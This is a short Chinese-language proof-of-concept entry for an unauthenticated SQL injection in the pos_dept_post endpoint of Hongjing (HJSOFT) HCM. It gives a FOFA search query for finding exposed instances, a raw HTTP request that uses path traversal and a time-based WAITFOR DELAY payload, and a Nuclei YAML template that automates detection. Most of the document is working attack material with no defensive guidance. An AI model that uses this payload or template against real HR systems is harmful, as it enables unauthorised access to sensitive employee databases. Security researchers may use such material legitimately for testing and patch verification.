## 宏景HCM-pos_dept_post存在SQL注入漏洞

宏景HCM pos_dept_post对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，未授权的攻击者可获取数据库敏感信息。

## fofa

```
app="HJSOFT-HCM"
```

## poc

```
POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 61

usertable=h00&usernumber=1&i9999=-1';WAITFOR DELAY '0:0:3'--+
```



## **Yaml**

```
id: hongjing-hcm-pos_dept_post-sql-injection

info:
  name: 宏景HCM-pos_dept_post-delay-sql注入漏洞
  author: onewin
  severity: high
  description: 宏景HCM-pos_dept_post-delay-sql注入漏洞
  metadata:
    fofa-query: app="HJSOFT-HCM"
  tags: hongjing,hcm,fileread

http:
- raw:
  - |-
    @timeout: 30s
    POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Content-Length: 61

    usertable=h00&usernumber=1&i9999=-1';WAITFOR DELAY '0:0:3'--+

  max-redirects: 3
  matchers-condition: and
  matchers:
      - type: dsl
        dsl:
          - 'duration>=3'#nuclei默认响应超时时间为5秒
```

